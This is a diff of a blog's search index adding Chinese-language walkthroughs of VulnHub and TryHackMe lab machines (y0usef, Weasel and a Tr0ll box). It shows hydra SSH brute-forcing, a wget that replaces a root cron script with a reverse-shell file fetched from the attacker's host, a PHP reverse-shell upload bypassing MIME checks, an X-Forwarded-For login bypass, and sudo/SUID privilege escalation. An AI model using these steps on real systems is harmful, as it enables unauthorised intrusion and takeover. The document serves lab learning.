+<p>试来试去都不行，唯一没试过的就是 <code>Pass.txt</code>  这个文件名当作密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -p Pass.txt 192.168.186.147 ssh</span><br></pre></td></tr></table></figure>
+
+<p>结果密码还真是  <code>Pass.txt</code> ，有点脑洞</p>
+<p><img src="/picture/image-20250408153754020.png" alt="image-20250408153754020"></p>
+<p>使用 SSH 远程登录</p>
+<p><img src="/picture/image-20250408160921699.png" alt="image-20250408160921699"></p>
+<p>接下来就是提权，枚举一遍后，发现如下权限为 777 的文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -perm 777 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/srv/ftp/lol.pcap</span><br><span class="line">/var/tmp/cleaner.py.swp</span><br><span class="line">/var/www/html/sup3rs3cr3tdirlol/roflmao</span><br><span class="line">/var/log/cronlog</span><br><span class="line">/lib/log/cleaner.py</span><br></pre></td></tr></table></figure>
+
+<p>在 &#x2F;var&#x2F;log&#x2F;cronlog 中可以发现 &#x2F;lib&#x2F;log&#x2F;cleaner.py 文件的调度任务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /var/log/cronlog</span><br><span class="line">*/2 * * * * cleaner.py</span><br></pre></td></tr></table></figure>
+
+<p>读取 &#x2F;lib&#x2F;log&#x2F;cleaner.py 文件，发现是定期删除 &#x2F;tmp 目录下文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /lib/log/cleaner.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">        os.system(<span class="string">&#x27;rm -r /tmp/* &#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>在本机制作 cleaner.py ，将反弹 shell 语句写入，通过 http 服务上传并覆盖 &#x2F;lib&#x2F;log&#x2F;cleaner.py</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://&lt;IP&gt;/cleaner.py -O /lib/log/cleaner.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250408161320240.png" alt="image-20250408161320240"></p>
+<p>开启 nc 监听，一会后就能获得反弹回来的 root  shell ，并获得 proof.txt</p>
+<p><img src="/picture/image-20250408161529607.png" alt="image-20250408161529607"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Tr0ll 2 Walkthrough</title>
     <url>/2025/04/09/Tr0ll%202/</url>
     <content><![CDATA[<h1 id="Tr0ll-2-Walkthrough"><a href="#Tr0ll-2-Walkthrough" class="headerlink" title="Tr0ll 2 Walkthrough"></a>Tr0ll 2 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/tr0ll-2,107/">Tr0ll: 2</a></p>
@@ -1741,77 +1741,6 @@
 
 <p>最终只有第三种成功了</p>
 <p><img src="/picture/image-20250408200146103.png" alt="image-20250408200146103"></p>
-]]></content>
-      <categories>
-        <category>Penetration Testing</category>
-      </categories>
-      <tags>
-        <tag>Penetration Testing</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>y0usef Walkthrough</title>
-    <url>/2025/03/29/y0usef/</url>
-    <content><![CDATA[<h1 id="y0usef-Walkthrough"><a href="#y0usef-Walkthrough" class="headerlink" title="y0usef Walkthrough"></a>y0usef Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：[y0usef: 1](<a href="https://www.vulnhub.com/entry/y0usef-1,624/">y0usef: 1 ~ VulnHub</a>)</p>
-<p><img src="/picture/image-20250329154643794.png" alt="image-20250329154643794"></p>
-<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先对目标主机做端口发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.74</span><br></pre></td></tr></table></figure>
-
-<p>目标主机开放 22、80 端口</p>
-<p><img src="/picture/image-20250329150831393.png" alt="image-20250329150831393"></p>
-<p>对开放的端口进行应用版本发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A -T4 172.16.33.74</span><br></pre></td></tr></table></figure>
-
-<p>22 端口开放 SSH 服务，80 端口开放 http 服务</p>
-<p><img src="/picture/image-20250329150903703.png" alt="image-20250329150903703"></p>
-<p>先来看 22 端口，尝试弱口令登陆，同时看看能不能泄露机密信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.74</span><br></pre></td></tr></table></figure>
-
-<p>可惜失败了，再来看 80 端口，进行目录扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.74</span><br></pre></td></tr></table></figure>
-
-<p>发现 &#x2F;adminstration 目录</p>
-<p><img src="/picture/image-20250329151251819.png" alt="image-20250329151251819"></p>
-<p>对 &#x2F;adminstration 目录进一步扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.74/adminstration</span><br></pre></td></tr></table></figure>
-
-<p>发现了很多目录，但是除了 &#x2F;adminstration&#x2F;include&#x2F; 都是 404</p>
-<p><img src="/picture/image-20250329151833451.png" alt="image-20250329151833451"></p>
-<p>访问 &#x2F;adminstration&#x2F;include ，发现两个文件，访问文件没有报错或者禁止访问，但是没有内容</p>
-<p>尝试添加 XFF 头指向 localhost 在进行访问，发现 &#x2F;adminstration 页面变化为登陆界面，弱口令 admin&#x2F;admin 即可进入后台</p>
-<p><img src="/picture/image-20250329152223913.png" alt="image-20250329152223913"></p>
-<p>上传文件，为 MIME 类型检测，将 PHP 木马的 Content-Type 更改为 image&#x2F;jpg 即可上传成功</p>
-<p><img src="/picture/image-20250329152351345.png" alt="image-20250329152351345"></p>
-<p>访问上传的文件 &#x2F;adminstration&#x2F;upload&#x2F;files&#x2F;1668608420php-reverse-shell.php ，同时开启 nc 监听，即可接收到回弹的 shell</p>
-<p><img src="/picture/image-20250329152620389.png" alt="image-20250329152620389"></p>
-<p>获得 TTY shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-
-<p>查看已登录用户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep bash</span><br></pre></td></tr></table></figure>
-
-<p>切换至 home 目录，查看有哪些用户主目录可以访问，却发现 user.txt</p>
-<p>··<img src="/picture/image-20250329153005316.png" alt="image-20250329153005316"></p>
-<p>查看 user.txt 发现是加密后数据，解密后为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh : </span><br><span class="line">user : yousef </span><br><span class="line">pass : yousef123</span><br></pre></td></tr></table></figure>
-
-<p>使用 SSH 远程登陆 yousef 账户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh yousef@172.16.33.74</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250329153710818.png" alt="image-20250329153710818"></p>
-<p>查看有哪些文件具有 SUID 权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p>发现 sudo 竟然有 SUID 权限，由于先前知道 yousef 的 SSH 密码，是否存在密码复用？</p>
-<p><img src="/picture/image-20250329153937600.png" alt="image-20250329153937600"></p>
-<p>尝试使用 sudo 提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sudo /bin/sh</span><br></pre></td></tr></table></figure>
-
-<p>输入密码 yousef123，竟然成功了</p>
-<p><img src="/picture/image-20250329154038217.png" alt="image-20250329154038217"></p>
-<p>直接获得 flag</p>
-<p><img src="/picture/image-20250329154135436.png" alt="image-20250329154135436"></p>
 ]]></content>
       <categories>
         <category>Penetration Testing</category>
@@ -1945,6 +1874,100 @@
 <p><img src="/picture/image-20250311180912900.png" alt="image-20250311180912900"></p>
 <p>最多等待 5 分钟 getshell 并取得 root.txt</p>
 <p><img src="/picture/image-20250311181018959.png" alt="image-20250311181018959"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>THM</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Weasel Walkthrough</title>
+    <url>/2025/04/19/Weasel/</url>
+    <content><![CDATA[<h1 id="Weasel-Walkthrough"><a href="#Weasel-Walkthrough" class="headerlink" title="Weasel Walkthrough"></a>Weasel Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://tryhackme.com/room/weasel">Weasel</a></p>
+<p>I think the data science team has been a bit fast and loose with their project resources.</p>
+<p><img src="/picture/image-20250419124028322.png" alt="image-20250419124028322"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>对目标 IP 进行端口发现和对开放的端口进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV 10.10.236.197 --min-rate 250 </span><br></pre></td></tr></table></figure>
+
+<p>发现 22 端口 SSH 服务，135 端口 RPC 服务，139 和 445 端口 SMB 服务，3389 端口远程桌面服务和 8888 端口 HTTP 服务</p>
+<p><img src="/picture/image-20250418170901712.png" alt="image-20250418170901712"></p>
+<p>先来看开放在 139&#x2F;445 端口的 SMB 服务，以下命令枚举失败</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p139,445 --script=smb-enum-* 10.10.236.197</span><br><span class="line">nmap -p139,445 --script=smb-vuln-* 10.10.236.197</span><br><span class="line">smbmap -H 10.10.236.197</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250418172900061.png" alt="image-20250418172900061"></p>
+<p>使用 smbclient 匿名登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N -L //10.10.236.197</span><br></pre></td></tr></table></figure>
+
+<p>发现 datasci-team 共享目录</p>
+<p><img src="/picture/image-20250418173134244.png" alt="image-20250418173134244"></p>
+<p>远程登陆 datasci-team 共享目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N //10.10.236.197/datasci-team</span><br></pre></td></tr></table></figure>
+
+<p>枚举其中文件</p>
+<p><img src="/picture/image-20250418173626910.png" alt="image-20250418173626910"></p>
+<p>将文件保存至本地，发现泄露了 token 文件</p>
+<p><img src="/picture/image-20250419102917847.png" alt="image-20250419102917847"></p>
+<p>以及在 requirements.txt  中泄露两个名字</p>
+<p><img src="/picture/image-20250419102833740.png" alt="image-20250419102833740"></p>
+<p>再来看看 RPC 服务，使用 rpcclient 远程登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient -U &quot;&quot; -N 10.10.33.243</span><br></pre></td></tr></table></figure>
+
+<p>似乎是权限不够没什么信息都没枚举出来，全是 ACCESS_DENIED</p>
+<p><img src="/picture/image-20250419103100165.png" alt="image-20250419103100165"></p>
+<p>最后来看 8888 端口，先对 WEB 目录进行枚举</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.10.33.243:8888/</span><br></pre></td></tr></table></figure>
+
+<p>发现泄露 &#x2F;robots.txt ，也泄露登陆页面</p>
+<p><img src="/picture/image-20250419103402761.png" alt="image-20250419103402761"></p>
+<p>访问 WEB 主页面，发现需要 token 登陆</p>
+<p><img src="/picture/image-20250419104231050.png" alt="image-20250419104231050"></p>
+<p>使用 SMB 共享中泄露的 token 成功登陆，发现是 SMB 文件共享页面</p>
+<p>在 New 处发现可以新增终端</p>
+<p><img src="/picture/image-20250419104438413.png" alt="image-20250419104438413"></p>
+<p>新增终端，看看该用户能执行什么 sudo 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>发现可以不需要密码执行 &#x2F;home&#x2F;dev-datasci&#x2F;.local&#x2F;bin&#x2F;jupyter</p>
+<p><img src="/picture/image-20250419112003351.png" alt="image-20250419112003351"></p>
+<p>但是并没有 &#x2F;home&#x2F;dev-datasci&#x2F;.local&#x2F;bin&#x2F;jupyter 文件，且 &#x2F;home&#x2F;dev-datasci&#x2F;.local&#x2F;bin 是权限 777 目录</p>
+<p><img src="/picture/image-20250419112209702.png" alt="image-20250419112209702"></p>
+<p>直接将 &#x2F;bin&#x2F;bash 命令复制进 &#x2F;home&#x2F;dev-datasci&#x2F;.local&#x2F;bin&#x2F;jupyter 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /home/dev-datasci/.local/bin/jupyter</span><br></pre></td></tr></table></figure>
+
+<p>直接 sudo 执行该文件，获得 root 权限</p>
+<p><img src="/picture/image-20250419112500868.png" alt="image-20250419112500868"></p>
+<p>很可惜，里面并没有 root.txt</p>
+<p><img src="/picture/image-20250419112646818.png" alt="image-20250419112646818"></p>
+<p>猜测我们所在的 WSL 中，主作系统是 Windows，目前我们使用的是安装在 WSL 中的 Linux</p>
+<p>如果以前使用过 WSL，则内部文件系统将装载在 WSL Linux 的 &#x2F;mnt 文件夹中，在 &#x2F;mnt 中发现空白的 c 文件夹，将 Windows 的 <code>C:</code> 盘挂载到 Linux 的 <code>/mnt/c</code> 目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t drvfs &#x27;c:&#x27; /mnt/c</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250419123231393.png" alt="image-20250419123231393"></p>
+<p>进入 C 盘，开始 Users 中发现可访问的 Administrator 目录</p>
+<p><img src="/picture/image-20250419123526532.png" alt="image-20250419123526532"></p>
+<p>在  Administrator 目录中发现 可访问的 Desktop 目录</p>
+<p><img src="/picture/image-20250419123627336.png" alt="image-20250419123627336"></p>
+<p>进入 Dessktop 目录，获得 root.txt</p>
+<p><img src="/picture/image-20250419123805744.png" alt="image-20250419123805744"></p>
+<p>在工作目录发现 <code>dev-datasci-lowpriv_id_ed25519</code>  ，ed25519 是一种基于椭圆曲线的数字签名算法，常用于 SSH 密钥或加密场景，结合目标主机开放 SSH 服务，那就不难猜测这个就是突破边界的方式</p>
+<p><img src="/picture/image-20250419105142552.png" alt="image-20250419105142552"></p>
+<p>由于 SSH 私钥的名称包含 <code>id</code> 字样，猜测 id 前面的 dev-datasci-lowpriv 为 SSH 登陆的用户名</p>
+<p><img src="/picture/image-20250419105718362.png" alt="image-20250419105718362"></p>
+<p>将私钥保存至本机，防止报错，将权限更改为 400 </p>
+<p><img src="/picture/image-20250419105945757.png" alt="image-20250419105945757"></p>
+<p>登陆 ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i ssh dev-datasci-lowpriv@10.10.57.233</span><br></pre></td></tr></table></figure>
+
+<p>成功远程登陆</p>
+<p><img src="/picture/image-20250419110155776.png" alt="image-20250419110155776"></p>
+<p>切换至 powershell ，列举当前目录</p>
+<p><img src="/picture/image-20250419110756537.png" alt="image-20250419110756537"></p>
+<p>由于开放 3389 远程桌面协议，先考虑进入 Desktop ，在其中获得 user.txt 内容</p>
+<p><img src="/picture/image-20250419110924097.png" alt="image-20250419110924097"></p>
+<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250419123916999.png" alt="image-20250419123916999"></p>
 ]]></content>
       <categories>
         <category>Penetration Testing</category>
@@ -2206,97 +2229,74 @@
       </tags>
   </entry>
   <entry>
-    <title>Weasel Walkthrough</title>
-    <url>/2025/04/19/Weasel%20/</url>
-    <content><![CDATA[<h1 id="Weasel-Walkthrough"><a href="#Weasel-Walkthrough" class="headerlink" title="Weasel Walkthrough"></a>Weasel Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://tryhackme.com/room/weasel">Weasel</a></p>
-<p>I think the data science team has been a bit fast and loose with their project resources.</p>
-<p><img src="/picture/image-20250419124028322.png" alt="image-20250419124028322"></p>
-<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>对目标 IP 进行端口发现和对开放的端口进行应用版本发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV 10.10.236.197 --min-rate 250 </span><br></pre></td></tr></table></figure>
+    <title>y0usef Walkthrough</title>
+    <url>/2025/03/29/y0usef/</url>
+    <content><![CDATA[<h1 id="y0usef-Walkthrough"><a href="#y0usef-Walkthrough" class="headerlink" title="y0usef Walkthrough"></a>y0usef Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：[y0usef: 1](<a href="https://www.vulnhub.com/entry/y0usef-1,624/">y0usef: 1 ~ VulnHub</a>)</p>
+<p><img src="/picture/image-20250329154643794.png" alt="image-20250329154643794"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先对目标主机做端口发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.74</span><br></pre></td></tr></table></figure>
 
-<p>发现 22 端口 SSH 服务，135 端口 RPC 服务，139 和 445 端口 SMB 服务，3389 端口远程桌面服务和 8888 端口 HTTP 服务</p>
-<p><img src="/picture/image-20250418170901712.png" alt="image-20250418170901712"></p>
-<p>先来看开放在 139&#x2F;445 端口的 SMB 服务，以下命令枚举失败</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p139,445 --script=smb-enum-* 10.10.236.197</span><br><span class="line">nmap -p139,445 --script=smb-vuln-* 10.10.236.197</span><br><span class="line">smbmap -H 10.10.236.197</span><br></pre></td></tr></table></figure>
+<p>目标主机开放 22、80 端口</p>
+<p><img src="/picture/image-20250329150831393.png" alt="image-20250329150831393"></p>
+<p>对开放的端口进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A -T4 172.16.33.74</span><br></pre></td></tr></table></figure>
 
-<p><img src="/picture/image-20250418172900061.png" alt="image-20250418172900061"></p>
-<p>使用 smbclient 匿名登陆</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N -L //10.10.236.197</span><br></pre></td></tr></table></figure>
+<p>22 端口开放 SSH 服务，80 端口开放 http 服务</p>
+<p><img src="/picture/image-20250329150903703.png" alt="image-20250329150903703"></p>
+<p>先来看 22 端口，尝试弱口令登陆，同时看看能不能泄露机密信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.74</span><br></pre></td></tr></table></figure>
 
-<p>发现 datasci-team 共享目录</p>
-<p><img src="/picture/image-20250418173134244.png" alt="image-20250418173134244"></p>
-<p>远程登陆 datasci-team 共享目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N //10.10.236.197/datasci-team</span><br></pre></td></tr></table></figure>
+<p>可惜失败了，再来看 80 端口，进行目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.74</span><br></pre></td></tr></table></figure>
 
-<p>枚举其中文件</p>
-<p><img src="/picture/image-20250418173626910.png" alt="image-20250418173626910"></p>
-<p>将文件保存至本地，发现泄露了 token 文件</p>
-<p><img src="/picture/image-20250419102917847.png" alt="image-20250419102917847"></p>
-<p>以及在 requirements.txt  中泄露两个名字</p>
-<p><img src="/picture/image-20250419102833740.png" alt="image-20250419102833740"></p>
-<p>再来看看 RPC 服务，使用 rpcclient 远程登陆</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient -U &quot;&quot; -N 10.10.33.243</span><br></pre></td></tr></table></figure>
+<p>发现 &#x2F;adminstration 目录</p>
+<p><img src="/picture/image-20250329151251819.png" alt="image-20250329151251819"></p>
+<p>对 &#x2F;adminstration 目录进一步扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.74/adminstration</span><br></pre></td></tr></table></figure>
 
-<p>似乎是权限不够没什么信息都没枚举出来，全是 ACCESS_DENIED</p>
-<p><img src="/picture/image-20250419103100165.png" alt="image-20250419103100165"></p>
-<p>最后来看 8888 端口，先对 WEB 目录进行枚举</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.10.33.243:8888/</span><br></pre></td></tr></table></figure>
+<p>发现了很多目录，但是除了 &#x2F;adminstration&#x2F;include&#x2F; 都是 404</p>
+<p><img src="/picture/image-20250329151833451.png" alt="image-20250329151833451"></p>
+<p>访问 &#x2F;adminstration&#x2F;include ，发现两个文件，访问文件没有报错或者禁止访问，但是没有内容</p>
+<p>尝试添加 XFF 头指向 localhost 在进行访问，发现 &#x2F;adminstration 页面变化为登陆界面，弱口令 admin&#x2F;admin 即可进入后台</p>
+<p><img src="/picture/image-20250329152223913.png" alt="image-20250329152223913"></p>
+<p>上传文件，为 MIME 类型检测，将 PHP 木马的 Content-Type 更改为 image&#x2F;jpg 即可上传成功</p>
+<p><img src="/picture/image-20250329152351345.png" alt="image-20250329152351345"></p>
+<p>访问上传的文件 &#x2F;adminstration&#x2F;upload&#x2F;files&#x2F;1668608420php-reverse-shell.php ，同时开启 nc 监听，即可接收到回弹的 shell</p>
+<p><img src="/picture/image-20250329152620389.png" alt="image-20250329152620389"></p>
+<p>获得 TTY shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
 
-<p>发现泄露 &#x2F;robots.txt ，也泄露登陆页面</p>
-<p><img src="/picture/image-20250419103402761.png" alt="image-20250419103402761"></p>
-<p>访问 WEB 主页面，发现需要 token 登陆</p>
-<p><img src="/picture/image-20250419104231050.png" alt="image-20250419104231050"></p>
-<p>使用 SMB 共享中泄露的 token 成功登陆，发现是 SMB 文件共享页面</p>
-<p>在 New 处发现可以新增终端</p>
-<p><img src="/picture/image-20250419104438413.png" alt="image-20250419104438413"></p>
-<p>新增终端，看看该用户能执行什么 sudo 命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p>查看已登录用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep bash</span><br></pre></td></tr></table></figure>
 
-<p>发现可以不需要密码执行 &#x2F;home&#x2F;dev-datasci&#x2F;.local&#x2F;bin&#x2F;jupyter</p>
-<p><img src="/picture/image-20250419112003351.png" alt="image-20250419112003351"></p>
-<p>但是并没有 &#x2F;home&#x2F;dev-datasci&#x2F;.local&#x2F;bin&#x2F;jupyter 文件，且 &#x2F;home&#x2F;dev-datasci&#x2F;.local&#x2F;bin 是权限 777 目录</p>
-<p><img src="/picture/image-20250419112209702.png" alt="image-20250419112209702"></p>
-<p>直接将 &#x2F;bin&#x2F;bash 命令复制进 &#x2F;home&#x2F;dev-datasci&#x2F;.local&#x2F;bin&#x2F;jupyter 文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /home/dev-datasci/.local/bin/jupyter</span><br></pre></td></tr></table></figure>
+<p>切换至 home 目录，查看有哪些用户主目录可以访问，却发现 user.txt</p>
+<p>··<img src="/picture/image-20250329153005316.png" alt="image-20250329153005316"></p>
+<p>查看 user.txt 发现是加密后数据，解密后为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh : </span><br><span class="line">user : yousef </span><br><span class="line">pass : yousef123</span><br></pre></td></tr></table></figure>
 
-<p>直接 sudo 执行该文件，获得 root 权限</p>
-<p><img src="/picture/image-20250419112500868.png" alt="image-20250419112500868"></p>
-<p>很可惜，里面并没有 root.txt</p>
-<p><img src="/picture/image-20250419112646818.png" alt="image-20250419112646818"></p>
-<p>猜测我们所在的 WSL 中，主作系统是 Windows，目前我们使用的是安装在 WSL 中的 Linux</p>
-<p>如果以前使用过 WSL，则内部文件系统将装载在 WSL Linux 的 &#x2F;mnt 文件夹中，在 &#x2F;mnt 中发现空白的 c 文件夹，将 Windows 的 <code>C:</code> 盘挂载到 Linux 的 <code>/mnt/c</code> 目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t drvfs &#x27;c:&#x27; /mnt/c</span><br></pre></td></tr></table></figure>
+<p>使用 SSH 远程登陆 yousef 账户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh yousef@172.16.33.74</span><br></pre></td></tr></table></figure>
 
-<p><img src="/picture/image-20250419123231393.png" alt="image-20250419123231393"></p>
-<p>进入 C 盘，开始 Users 中发现可访问的 Administrator 目录</p>
-<p><img src="/picture/image-20250419123526532.png" alt="image-20250419123526532"></p>
-<p>在  Administrator 目录中发现 可访问的 Desktop 目录</p>
-<p><img src="/picture/image-20250419123627336.png" alt="image-20250419123627336"></p>
-<p>进入 Dessktop 目录，获得 root.txt</p>
-<p><img src="/picture/image-20250419123805744.png" alt="image-20250419123805744"></p>
-<p>在工作目录发现 <code>dev-datasci-lowpriv_id_ed25519</code>  ，ed25519 是一种基于椭圆曲线的数字签名算法，常用于 SSH 密钥或加密场景，结合目标主机开放 SSH 服务，那就不难猜测这个就是突破边界的方式</p>
-<p><img src="/picture/image-20250419105142552.png" alt="image-20250419105142552"></p>
-<p>由于 SSH 私钥的名称包含 <code>id</code> 字样，猜测 id 前面的 dev-datasci-lowpriv 为 SSH 登陆的用户名</p>
-<p><img src="/picture/image-20250419105718362.png" alt="image-20250419105718362"></p>
-<p>将私钥保存至本机，防止报错，将权限更改为 400 </p>
-<p><img src="/picture/image-20250419105945757.png" alt="image-20250419105945757"></p>
-<p>登陆 ssh</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i ssh dev-datasci-lowpriv@10.10.57.233</span><br></pre></td></tr></table></figure>
+<p><img src="/picture/image-20250329153710818.png" alt="image-20250329153710818"></p>
+<p>查看有哪些文件具有 SUID 权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p>成功远程登陆</p>
-<p><img src="/picture/image-20250419110155776.png" alt="image-20250419110155776"></p>
-<p>切换至 powershell ，列举当前目录</p>
-<p><img src="/picture/image-20250419110756537.png" alt="image-20250419110756537"></p>
-<p>由于开放 3389 远程桌面协议，先考虑进入 Desktop ，在其中获得 user.txt 内容</p>
-<p><img src="/picture/image-20250419110924097.png" alt="image-20250419110924097"></p>
-<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250419123916999.png" alt="image-20250419123916999"></p>
+<p>发现 sudo 竟然有 SUID 权限，由于先前知道 yousef 的 SSH 密码，是否存在密码复用？</p>
+<p><img src="/picture/image-20250329153937600.png" alt="image-20250329153937600"></p>
+<p>尝试使用 sudo 提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sudo /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>输入密码 yousef123，竟然成功了</p>
+<p><img src="/picture/image-20250329154038217.png" alt="image-20250329154038217"></p>
+<p>直接获得 flag</p>
+<p><img src="/picture/image-20250329154135436.png" alt="image-20250329154135436"></p>
 ]]></content>
       <categories>
         <category>Penetration Testing</category>
       </categories>
       <tags>
         <tag>Penetration Testing</tag>
-        <tag>THM</tag>
+        <tag>vulnhub</tag>
       </tags>
   </entry>
 </search>
